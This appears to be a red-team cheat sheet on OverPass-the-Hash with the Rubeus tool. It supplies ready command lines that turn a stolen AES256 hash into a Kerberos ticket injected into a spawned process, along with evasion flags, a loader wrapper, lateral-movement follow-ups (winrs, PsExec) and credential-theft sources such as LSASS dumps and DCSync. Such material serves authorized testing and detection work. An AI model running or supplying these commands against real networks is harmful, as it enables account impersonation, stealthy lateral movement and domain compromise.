# OverPass-the-Hash (Rubeus)

Use an AES256 or RC4 hash to request a TGT (as if you knew the password), then inject into a new process.

## Request TGT and Spawn Process
```
Loader.exe -path Rubeus.exe -args asktgt /user:<USER> /aes256:<aes256_hash> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
- `/opsec` — uses AES256 and sets PA-DATA flags to avoid RC4 downgrade detection
- `/createnetonly:cmd.exe` — spawns a sacrificial process; TGT injected into it
- `/show` — displays the spawned process window

## With Domain Specification (cross-domain)
```
Loader.exe -path Rubeus.exe -args asktgt /user:<USER> /aes256:<aes256_hash> /domain:<DOMAIN_FQDN> /dc:<DC_FQDN> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

## Notes
- Better OPSEC than Pass-the-Hash (PTH) — no RC4 NTLM authentication events
- Spawned process inherits network identity of target user
- From spawned process: `winrs -r:<TARGET> cmd`, PsExec, etc.
- Get hash from: `sekurlsa::ekeys`, DCSync, LSASS dump
